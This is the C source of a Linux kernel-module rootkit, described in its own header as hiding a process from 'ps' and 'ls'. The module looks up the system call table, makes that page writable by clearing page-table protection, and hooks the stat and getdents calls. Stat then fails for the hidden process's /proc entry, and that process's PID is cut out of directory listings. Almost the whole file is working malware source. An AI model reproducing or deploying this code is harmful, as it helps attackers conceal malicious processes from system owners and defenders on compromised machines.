#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#define MAX_PATH 100

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Daniel Niv");
MODULE_VERSION("0.0.1");
MODULE_DESCRIPTION("A Rootkit for hiding a process from 'ps' and 'ls' commands");

// the module parameters
unsigned long kallsyms_lookup_addr;
char *hiding_pid;
module_param(kallsyms_lookup_addr, ulong, S_IRUGO);
MODULE_PARM_DESC(kallsyms_lookup_addr, "kallsyms_lookup_name(char *path) function address");
module_param(hiding_pid, charp, S_IRUGO); 
MODULE_PARM_DESC(hiding_pid, "the process to hide pid");

struct linux_dirent {
	unsigned long  d_ino;     /* Inode number */
        unsigned long  d_off;     /* Offset to next linux_dirent */
        unsigned short d_reclen;  /* Length of this linux_dirent */
        char           d_name[];  /* Filename (null-terminated) */
};

// defining the pointers to kallsyms_lookup_name function, syscall table, and old stat and old getdents handler
unsigned long (*kallsyms_lookup_name)(const char *name);
unsigned long *sys_call_table;
asmlinkage int (*old_stat)(const struct pt_regs *regs);
asmlinkage int (*old_getdents)(const struct pt_regs *regs);
char proc_path[MAX_PATH];

// function to change addr page to rw.
int set_addr_rw(unsigned long _addr) {

        unsigned int level;
        pte_t *pte;

        pte = lookup_address(_addr, &level);

        if (pte->pte &~ _PAGE_RW) {
                pte->pte |= _PAGE_RW;
        }

        return 0;
}

// function to change addr page to ro.
int set_addr_ro(unsigned long _addr) {

        unsigned int level;
        pte_t *pte;

        pte = lookup_address(_addr, &level);
        pte->pte = pte->pte &~_PAGE_RW;

        return 0;
}

//fuction that sets buffer to correct string: '/proc/hiding_pid'
void init_buffer(void) {

        strcpy(proc_path, "/proc/");
        strcpy(proc_path + strlen("/proc/"), hiding_pid);
}

asmlinkage int new_stat(const struct pt_regs *regs) {

	char *path = (char*) regs->di;

       // perform our malicious code here- the HOOK!
       if (strstr(path, proc_path) != NULL) {
	       
	       // inside the call to our hidden process, return error
	       return -1;
	}

        // executing the original stat handler
        return (*old_stat)(regs);
}

asmlinkage int new_getdents(const struct pt_regs *regs) {

        int ret;

        // the current structure
        struct linux_dirent *curr = (struct linux_dirent*)regs->si;

        int i = 0;

        ret = (*old_getdents)(regs);

	// going threw the entries, looking for our pid
        while (i < ret) {

		// checking if it is our process
                if (!strcmp(curr->d_name, hiding_pid)) {

                                // length of this linux_dirent
                                int reclen = curr->d_reclen;
                                char *next = (char*)curr + reclen;
                                int len = (int)regs->si + ret - (uintptr_t)next;
                                memmove(curr, next, len);
                                ret -= reclen;
                                continue;
                }

                i += curr->d_reclen;
                curr = (struct linux_dirent*)((char*)regs->si + i);
        }

        return ret;
}

static int __init rootkit_init(void) {

	init_buffer();

        // initializing kallsyms_lookup_name and hiding_pid pointers with their addresses
        kallsyms_lookup_name = (void*) kallsyms_lookup_addr;
	hiding_pid = hiding_pid;

        // getting syscall table address from kallsyms_lookup_name function
        sys_call_table = (unsigned long*)(*kallsyms_lookup_name)("sys_call_table");

        // syscall table is read only, and we want to override it
        set_addr_rw((unsigned long) sys_call_table);

        // saving the old stat and getdents handlers
        old_stat = (void*) sys_call_table[__NR_stat];
	old_getdents = (void*) sys_call_table[__NR_getdents];

        sys_call_table[__NR_stat] = (unsigned long) new_stat;
	sys_call_table[__NR_getdents] = (unsigned long) new_getdents;

        set_addr_ro((unsigned long) sys_call_table);
        return 0;
        }

static void __exit rootkit_exit(void) {

        set_addr_rw((unsigned long) sys_call_table);

        // setting the old open pointer to syscall table
        sys_call_table[__NR_stat] = (unsigned long) old_stat;

	sys_call_table[__NR_getdents] = (unsigned long) old_getdents;

        set_addr_ro((unsigned long) sys_call_table);

        return;
}

module_init(rootkit_init);
module_exit(rootkit_exit);
